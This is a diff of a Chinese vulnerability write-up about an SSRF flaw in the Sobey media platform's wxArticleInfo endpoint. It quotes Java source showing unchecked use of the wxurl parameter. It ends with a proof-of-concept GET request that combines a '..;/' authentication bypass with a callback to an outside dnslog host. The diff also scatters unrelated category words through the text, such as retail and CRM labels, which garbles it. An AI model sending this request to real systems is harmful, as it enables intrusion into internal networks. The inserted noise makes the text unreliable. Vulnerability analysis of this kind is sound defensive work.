@@ -6,9 +6,9 @@ asset_dir: embedded-base64
 
 # 漏洞简介
 
-索贝融媒体是一套面向新闻传媒行业的内容生产与发布平台，主要用于稿件采编、融媒协同管理以及多渠道分发。该系统的 **/sobey-mchEditor/mch/WXArticleInt/wxArticleInfo** 接口在处理外部请求参数时缺乏严格的地址校验与访问控制，导致存在服务器端请求伪造（[SSRF](https://mrxn.net/tag/SSRF)）[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。攻击者可通过该漏洞诱导服务器发起任意 HTTP/HTTPS 请求，从而探测内网服务结构、访问受限接口，甚至在特定条件下实现对内网应用的数据窃取或进一步利用。
+索贝融媒体是一套面向新闻传媒行业的内容生产与发布平台，主要用于稿件采编、融媒协同管理以及多渠道分发。该系统的 **/sobey-mchEditor/mch/WXArticleInt/wxArticleInfo** 接口在处理外部请求参数时缺乏严格的地址校验与访问控制，导致存在服务器端请求伪造（[SSRF](https://mrxn.net/tag/SSRF)）[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。攻击者可通过该漏洞诱导服务器发起任意 HTTP/HTTPS 请求，从而探测内网服务结构、访问受限接口，甚至在特定条件下实现对内网应用的[数据](#)窃取或进一步利用。
 
-网络
+传播与媒体研究
 
 # 影响版本
 
@@ -24,13 +24,15 @@ asset_dir: embedded-base64
 
 直接进入看它的实现逻辑如下
 
+食品百货零售商
+
 深入探索
 
-数据管理
+防病毒程序与恶意软件
 
-软件
+博客资源与服务
 
-计算机服务器
+客户关系管理
 
 ```
 @RequestMapping(
@@ -56,6 +58,8 @@ public Response wxArticleInfo(@RequestParam("token") String token, @RequestParam
 ```
 
 参数**wxurl**被带入`parseWXDoc`方法，跟进查看其实现逻辑
+
+网络安全
 
 ```
 private static Map<String, String> parseWXDoc(String requestUrl) {
@@ -87,6 +91,8 @@ requestUrl被直接使用Jsoup.connect进行访问，整个过程中对**wxurl�
 # 漏洞复现
 
 > 权限绕过相关分析可以参考之前的 [索贝融媒体 getList SQL注入漏洞](https://mrxn.net/jswz/sobey-Articlelist-getList-sqli.html) 的权限校验部分
+>
+> 黑客与破解
 
 ```
 GET /sobey-mchEditor/js/..;/mch/WXArticleInt/wxArticleInfo?siteCode=&token=&wxurl=http://xxe.dnslog.pt/xxe_test HTTP/1.1
